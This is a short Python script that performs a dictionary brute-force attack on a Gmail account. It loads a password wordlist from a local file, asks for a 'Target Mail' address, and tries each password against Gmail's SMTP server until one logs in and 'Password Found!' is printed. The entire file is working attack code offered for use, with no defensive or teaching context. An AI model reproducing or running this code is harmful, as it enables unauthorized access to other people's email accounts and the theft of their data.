def login(data="Data\\MiniData.txt"):
    import smtplib
    import time
    import random
    from.iControl import CheckTheInternet
    data = open(data,"r")
    pwd_list = data.readlines()
    uname = input("Target Mail: ")
    connect = smtplib.SMTP_SSL('smtp.gmail.com',465)
    connect.ehlo()
    counter = 0
    uzunluk_al = len(pwd_list)
    i=-1
    while (i<uzunluk_al):
        try:
            
            if CheckTheInternet():
                i+=1
                print("{0}/{2} : {1}".format(counter,pwd_list[i],uzunluk_al))
                counter+=1
                if connect.login(uname,pwd_list[i]):
                    print("{0}/{2} : Password Found! {1}".format(counter,pwd_list[i],uzunluk_al))
                    counter+=1  
                    break
            else:
                print("No Internet Connection!...")                                             
           
        except smtplib.SMTPAuthenticationError:
            print("Authentication Err")
            continue
        except smtplib.SMTPServerDisconnected:
            print("Disconnected Err")
            continue
        except:
            print("Unexpected error")
